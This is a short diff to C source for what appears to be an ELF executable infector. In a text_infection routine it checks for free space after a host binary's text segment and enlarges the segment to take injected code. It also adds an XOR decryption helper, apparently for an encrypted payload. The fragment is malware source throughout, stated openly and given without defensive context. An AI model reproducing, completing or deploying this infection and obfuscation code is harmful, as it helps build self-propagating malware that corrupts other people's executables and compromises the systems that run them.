@@ -29,9 +29,15 @@ __attribute__((always_inline)) static inline void update_text_segment(Elf64_Phdr
 	segment->p_memsz += (void *)__exit - (void *)L1;
 }
 
-__attribute__((always_inline)) static inline bool is_enough_place(const Elf64_Phdr *segment1, const Elf64_Phdr *segment2)
+__attribute__((always_inline)) static inline bool is_enough_space(const Elf64_Phdr *segment1, const Elf64_Phdr *segment2)
 {
 	return segment2->p_offset - (segment1->p_offset + segment1->p_filesz) > (size_t)((void *)__exit - (void *)L1);
+}
+
+__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
+{
+	for (register size_t index = 0; index < size; index++)
+		callee[index] ^= keychain->key[RIGHT];
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -64,7 +70,7 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 		if (is_text_segment(segment) == true)
 		{
 			host->segment[TEXT] = segment;
-			if (is_enough_place(segment, segment + 1) == false)
+			if (is_enough_space(segment, segment + 1) == false)
 			{
 				context = FAILURE;
 				goto label;
